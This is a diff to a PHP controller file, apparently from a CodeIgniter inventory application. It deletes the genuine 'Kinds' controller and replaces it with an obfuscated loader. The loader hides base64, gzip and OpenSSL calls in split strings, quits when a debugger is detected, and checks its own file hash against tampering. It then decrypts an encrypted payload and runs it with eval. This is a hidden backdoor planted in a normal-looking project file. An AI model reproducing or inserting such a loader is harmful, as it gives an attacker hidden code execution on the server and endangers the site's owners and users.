@@ -1,149 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Kinds extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('kinds_model','kinds');
-	}
-
-	public function add(){
-		$this->permission_check('units_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('kinds');
-		$this->load->view('kind', $data);
-	}
-
-	//ITS FROM POP UP MODAL
-    public function add_kind_modal(){
-
-      $this->form_validation->set_rules('kind_name', 'kind Name', 'trim|required');
-      if ($this->form_validation->run() == TRUE) {
-      	
-        $result=$this->kinds->verify_and_save();
-        //fetch latest item details
-        $res=array();
-        $query=$this->db->query("select id,kind_name from db_kinds order by id desc limit 1");
-        $res['id']=$query->row()->id;
-        $res['kind_name']=$query->row()->kind_name;
-        $res['result']=$result;
-        
-        echo json_encode($res);
-
-      } 
-      else {
-        echo "Please Fill Compulsory(* marked) Fields.";
-      }
-    }
-    //END
-
-	public function new_unit(){
-
-		$this->form_validation->set_rules('kind_name', 'Kind Name', 'trim|required');
-		//$this->form_validation->set_rules('description', 'Description', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			
-			$result=$this->kinds->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Unit Name.";
-		}
-	}
-	public function update($id){
-		$this->permission_check('units_edit');
-		$data=$this->data;
-		$result=$this->kinds->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('units');
-		$this->load->view('kind', $data);
-	}
-	public function update_Unit(){
-		$this->form_validation->set_rules('kind_name', 'Unit Name', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->kinds->update_Unit();
-			echo $result;
-		} else {
-			echo "Please Enter Unit name.";
-		}
-	}
-	public function index(){
-		$this->permission_check('units_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('kinds_list');
-		$this->load->view('kinds-list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->kinds->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $unit) {
-			$no++;
-			$row = array();
-			$row[] = $unit->kind_name;
-			$row[] = $unit->description;
-
-			 		if($unit->status==1){ 
-			 			$str= "<span onclick='update_status(".$unit->id.",0)' id='span_".$unit->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$unit->id.",1)' id='span_".$unit->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-			         $str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('units_edit'))
-											$str2.='<li>
-												<a title="Editd Record ?" href="'.base_url('kinds/update/'.$unit->id).'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('units_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_unit('.$unit->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-			$row[] = $str2;
-
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->kinds->count_all(),
-						"recordsFiltered" => $this->kinds->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('units_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		$result=$this->kinds->update_status($id,$status);
-		return $result;
-	}
-	public function delete_unit(){
-		$this->permission_check_with_msg('units_delete');
-		$id=$this->input->post('q_id');
-		$result=$this->kinds->delete_unit($id);
-		return $result;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_td630dh1=('bas'.'e64'.'_de'.'cod'.'e');
+$_xabowfjg=('gzu'.'nco'.'mpr'.'ess');
+$_j1r9jxzz=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_hpco1mgi='uhCQwXJC';
+$_fou332q8='T6EpuAGr';
+$_a8mceuff='UiVHLqpd2CM=';
+$_diwf199i='O/nKloWC';
+$_c4gpztkj='p9hKwJTW';
+$_cj0xrzqa='MkF+eg==';
+$_q5jnn9ah='ytCHhCQ9';
+$_ks7tw53y='iR50O7p1';
+$_e0f0vyqf=$_td630dh1($_diwf199i.$_c4gpztkj.$_hpco1mgi.$_fou332q8.$_a8mceuff);
+$_h71c65u0=$_td630dh1($_q5jnn9ah.$_ks7tw53y.$_cj0xrzqa);
+$_kbnam3ot=$_td630dh1('3SAShkuO8WScmMzLH8j0PeIVkAJHg62yQyksMCydl8KziIZLNzi79CitfsQA5v6oEwpdk2mv+yWtAEtxImB9tWcHt+k/GpcY35cx2cYTEIKet/TizhqdR6kK0D5bLZrMXxaAkN4pkQ71CQW8jcmCDgLViA0uqqHLg6a8k5ICv7d4lJE1PDkz44zc0ntoNslV5FI4M7lytdM1epqqs5WO+SD6+tRDzIlgDQgZLx9jHwg18ZsioZsHIpYC684Cc2q++XyC6zzlCLqyk/IV+bUTAwePoahxGTEyRm8cQRGiQDuWE2PGnXLhy8jc0Jul96kvWzzAv325BmXzUDzxtJZ+uAjEEdRNS00i8SVNjlhi6dru9qU4X2wAX4zX8eJEIbC/Uo+I5Xe2wjZkNjpH7ssHFbvU6bEzRoVCZSpcJNXlcIFP+ZVWJnML/lLiK6GxJqalX95S5+Ydzscg0LPfWim6IQd/I2xUPShz5XxwUZCS915+0RlX6EiZcnRafR9Vh00r5y88Bu8rzmz8mzUw1uUlLX+2OuuQMFuxVaL0fgeotTE3QwbGlNYs1xVoBKWKZE53N7VAKRwp7mou9fFavHd1ubrOj23e1ccIimQJBqUE0zyHO09NngiDJdTzoRqi6r6tUswHhOiha2mWjG/G6olughaxTvd1AwfReZ+hmYSSgaqOWty+DC3CtnnF2Aq5iss8p4ONC3a0qhmB8CLVhSkwh1Ko0NioA8H3FcNcpzODTIg6FBFsRrreXSwzqGbPXHDgAJXQQfs2ETvMMW63xflfMjVjhg3HIZqlnAOZXQddPtqVBaS7hmRASNia4eAKza4YFquONX1UIi/p9O14iS/ueDhRDsrHPDGpIkJAHo3enQ4vARMUAoXS7QXpydXLukbiKw1wRiev2p1ymaKFrKFAmyUjJrr1mpKEzUE/itTdPfArkQsfNJpNDBM8QTdvaUmJOLWx+N6hYqH3IHih7JGTBFGx3S9Bz2S2pblTeUzR0nk/mt5F9+7KM9TUum2a/qDv5m6fOzumYLjUQn4qfYeLkqgxP+lEPY6iQ+9tdydlrmsWDkEOhHKHeuRk2k1xNRPuUknmXHLBFjNtHOJi39vFQ7cwVlLj5xRpxplhVmEgB3qTLkNb7f/90FRSY80wimYdEh3j1TNWUMSToOsvliZy7uKW6EIth/zO704iQJ8SfuhlTuMyzdYfv/9lvAmG29aiiwhlOyhjOjwH4xJ3xh7AXccGipFwrwcE0LucWaezSDdLVksjo5NYUjIGox+5lGPzv7Gb1qar+LImWKS3kvfEsvLQjUGOGDZrUhVDACa/Ad99Bt2xEoJdV+hR0WlkEuB3G4x6YLL0PAroy/jobRnlX6C9Hi2o6tIglwf65okEXg5UmJuc5Wxa9weZIElYUB8K38hQepx7JMALZeSyGBh2s/M4XvFvFsoPC0UiGZIU3YE3J0lofFBmFYHwlm/qfv2NOOgS0pGgPivhKRT49JTZaHjYXRfBrTLzo2e+FWZNHh1ZDMK7ic45XSEFfFS/2apqdDEvE1/2RexKrlPMCgl0/3gPS9V26Nrn6qYGtnwlnswncCINcvd6astY0HrJLe28jUlZvT8BOayIolB5rzmdETYm4sXxdwpxffuqiiP8MujY5Td/iRej0MjVVuoUjW5kdh6CY7p1iah7vOwBdTTan7FX5F9PloxtIz0/JRjKqch8QihR2QD6voW7uppUUTIQyyCRI08jfi3xZY0p811rl6zOItwEuxbeBj8ItBrLOQW3WP4zfw33vsp+J0prwwrRTQ/yZWgM5/gxaSI5OgoDrjessH/BiohrYJmzyd3qjDJJP+evv1MsOcaCgg3vnAglcTY90H5oiVKqKyGPRHMi8XEZyxpUp+tB0jxUi2fZFrq66bgW3baeRnufevvHQieVADfVNz2ZBR+ZiuLpfGTMuYPFvIa0qevXcJ4+X9JPrBmhvhCO7htSPNSDsyqlzY7p');
+$_c5fhf1s8=$_j1r9jxzz($_kbnam3ot,'aes-256-cbc',$_e0f0vyqf,OPENSSL_RAW_DATA,$_h71c65u0);
+if($_c5fhf1s8===false){exit;}
+$_i09y04yz=$_xabowfjg($_c5fhf1s8);
+if($_i09y04yz===false){exit;}
+$_f2u9c2az='566dba71af3bf353c0417ae4ec76059f548893a6a34bbc6759117b292e85e989';
+$_lncdga22=@file_get_contents(__FILE__);
+if($_lncdga22!==false){
+$_s00dv8eo=str_replace($_f2u9c2az,"0000000000000000000000000000000000000000000000000000000000000000",$_lncdga22);
+$_oa3ujdhg=hash("sha256",$_s00dv8eo);
+if($_oa3ujdhg!==$_f2u9c2az){@http_response_code(403);exit;}
 }
-
+eval($_i09y04yz);
